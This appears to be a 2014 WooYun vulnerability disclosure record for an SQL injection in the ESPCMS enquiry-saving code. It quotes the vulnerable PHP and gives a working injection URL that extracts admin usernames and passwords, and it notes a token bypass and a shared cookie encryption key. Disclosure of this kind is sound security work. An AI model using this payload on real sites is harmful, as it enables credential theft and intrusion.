{"id": 742, "wybug_id": "wooyun-2014-068516", "wybug_title": "espcms sql注入漏洞", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "Noxxx", "wybug_date": "2014-07-15 00:45", "wybug_open_date": "2014-10-13 00:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-13：\t细节向公众公开  简要描述： sql注入 详细说明：  文件 /interface/enquiry.php :        in_enquirysave 函数中 \nif (!$this->fun->is_token()) { //这里 可以直接绕过的 \t\t\t$this->callmessage($this->lng['repeatinput'], $linkURL, $this->lng['gobackbotton']);\t\t} \t\t$lng = (admin_LNG == 'big5') ? $this->CON['is_lancode'] : admin_LNG;\t\tif ($this->CON['is_enquiry_memclass']) {\t\t\tparent::member_purview(0, $this->get_link('enquiry', array(), admin_LNG));\t\t}\t\t$cartid = $this->fun->eccode($this->fun->accept('ecisp_enquiry_list', 'C'), 'DECODE', db_pscode);\t\t$cartid = stripslashes(htmlspecialchars_decode($cartid));\t\t$uncartid = !empty($cartid) ? unserialize($cartid) : 0;\t\t\t\t$userid = intval($this->fun->accept('userid', 'P'));\t\t$userid = !empty($userid) ? $userid : 0;\t\t$linkman = trim($this->fun->accept('linkman', 'P', true, true));\t\t$linkman = $this->fun->substr($linkman, 20);\t\t$email = $this->fun->accept('email', 'P', true, true);\t\t$sex = $this->fun->accept('sex', 'P');\t\t$sex = empty($sex) ? 0 : intval($sex);\t\t$country = intval($this->fun->accept('cityone', 'P'));\t\t$country = empty($country) ? 0 : $country;\t\t$province = intval($this->fun->accept('citytwo', 'P'));\t\t$province = empty($province) ? 0 : $province;\t\t$city = intval($this->fun->accept('citythree', 'P'));\t\t$city = empty($city) ? 0 : $city;\t\t$district = intval($this->fun->accept('district', 'P'));\t\t$district = empty($district) ? 0 : $district;\t\t$address = trim($this->fun->accept('address', 'P', true, true));\t\t$address = $this->fun->substr($address, 120);\t\t$zipcode = trim($this->fun->accept('zipcode', 'P', true, true));\t\t$zipcode = $this->fun->substr($zipcode, 10);\t\t$tel = trim($this->fun->accept('tel', 'P', true, true));\t\t$tel = $this->fun->substr($tel, 20);\t\t$mobile = trim($this->fun->accept('mobile', 'P', true, true));\t\t$mobile = $this->fun->substr($mobile, 15);\t\t$fax = trim($this->fun->accept('fax', 'P', true, true));\t\t$fax = $this->fun->substr($fax, 15);\t\t$content = trim($this->fun->accept('content', 'P', true, true));\t\t$content = $this->fun->substr($content, 500);\t\t$amount = $this->fun->accept('amount', 'P');\t\t$ptitle = $this->fun->accept('ptitle', 'P');\t\t$tsn = $this->fun->accept('tsn', 'P');\t\t$did = $this->fun->accept('did', 'P');\t\t\tif (empty($did) || empty($amount) || empty($ptitle)) {\t\t\t$enquirylink = $this->get_link('enquiry', array(), admin_LNG);\t\t\t$this->callmessage($this->lng['enquiry_input_err'], $enquirylink, $this->lng['enquiry_into_listbotton']);\t\t}\t\t\t\tif (!preg_match(\"/^\\w+((-\\w+)|(\\.\\w+))*\\@[A-Za-z0-9]+((\\.|-)[A-Za-z0-9]+)*\\.[A-Za-z0-9]+$/i\", $email)) {\t\t\t$this->callmessage($this->lng['email_err'], $_SERVER['HTTP_REFERER'], $this->lng['gobackbotton']);\t\t}\t\t$enquirysn = date('YmdHis') . rand(100, 9999);\t\t$db_table = db_prefix . 'enquiry';\t\t$db_table2 = db_prefix . 'enquiry_info';\t\t$addtime = time();\t\t$db_field = 'enquirysn,userid,linkman,sex,country,province,city,district,address,zipcode,tel,fax,mobile,email,content,isclass,addtime,edittime';\t\t$db_values = \"'$enquirysn',$userid,'$linkman',$sex,$country,$province,$city,$district,'$address','$zipcode','$tel','$fax','$mobile','$email','$content',0,$addtime,0\";\t\t$this->db->query('INSERT INTO ' . $db_table . ' (' . $db_field . ') VALUES (' . $db_values . ')');\t\t$insert_id = $this->db->insert_id();\t\t$db_values = '';\t\t$arraycount = count($did) - 1;\t\t\t\t\tforeach ($did as $key => $value) {\t\t\t$value = intval($value);\t\t\t$amount[$key] = intval($amount[$key]);\t\t\tif ($key == $arraycount) {\t\t\t\t$db_values.= \"($insert_id,$value,'$tsn[$key]','$ptitle[$key]',$amount[$key],'')\";\t\t\t} else {\t\t\t\t$db_values.= \"($insert_id,$value,'$tsn[$key]','$ptitle[$key]',$amount[$key],''),\";\t\t\t}                 // 关键是这里 和 DZ7.2那个注入漏洞一样 如果 tsn并不是数组的话 他就会 等同于 $XX{a} 我们提交   tsn = \\ 绕过转义的限制 从而导致的注入\t\t}\t\t$db_field = 'eid,did,tsn,title,amount,comment';\t\t$this->db->query('INSERT INTO ' . $db_table2 . ' (' . $db_field . ') VALUES ' . $db_values); //进入查询\n这里还有就是 userid需要自己提交  did的产品id必须为存在的  产品展示->里面就能找到idhttp://127.0.0.1/php/espcmsv/index.php?ac=enquiry&at=enquirysavetsn=\\&userid=3&did[x]=1&amount=1&ptitle[x]=,(SELECT CONCAT(USERNAME,0x7c,PASSWORD) FROM espcms_admin_member LIMIT 1 ),1,1)#&email=xxx@qq.com   漏洞证明：  \n\n\n\n\n\n   修复方案：  还有问题 就是 前台和后台cookie的加密密匙一样的..比较危险 前台有个地方可以生成加密cookie 变量是可控的  就是 有个问题 导致不成功 .  看了前面几个人提交的漏洞 加密函数这个问题 一直都没修复   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-07-15 11:04 厂商回复： 感谢支持,我们会尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-15 11:14 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  5rank??    \n     2014-08-05 12:12 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  官方都不修复了...- -    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}